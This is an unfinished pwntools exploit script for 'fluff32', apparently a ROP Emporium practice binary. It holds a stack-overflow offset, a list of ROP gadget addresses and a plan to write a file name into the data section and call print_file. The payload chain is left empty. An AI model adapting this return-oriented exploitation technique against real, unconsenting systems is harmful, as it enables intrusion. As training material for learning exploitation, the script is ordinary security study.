#!/usr/bin/python3
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    p = process(exe)
    p.sendlineafter('> ', payload)
    
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    #ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset


# Specify your GDB script here for debugging
gdbscript = '''
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './fluff32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

offset = 44 # find_ip(cyclic(100))

io = start()

# Note that these are all @plt addresses
# Obtained via gdb: info functions
print_file = 0x080483d0

"""
The game plan:
- Use the xchg gadget to write into the data section 1 byte at a time
- Use the pop ecx; bswap ecx; to get the data section address into the ecx
- In order to modify the dl (last byte of edx), need to use long pext
    which is a convoluted masking thing (https://www.felixcloutier.com/x86/pext)
"""

# Gadgets
# 0x08048555 <+18>:	xchg   BYTE PTR [ecx],dl
# 0x08048558: pop ecx; bswap ecx; ret; 
# 0x08048399: pop ebx; ret; 
# 0x0804854a: pext edx,ebx,eax; mov eax,0xdeadbeef; ret

data_section = 0x0804a018 + 0x4
xchg_ecx_dl = 0x08048555
pop_ecx_bswap_ecx = 0x08048558
pop_ebx = 0x08048399
pext_long = 0x0804854a

payload = flat({
	offset: [

    ]
})

io.sendlineafter("> ", payload)
io.recvlineS()
flag = io.recvlineS()
log.success(flag)
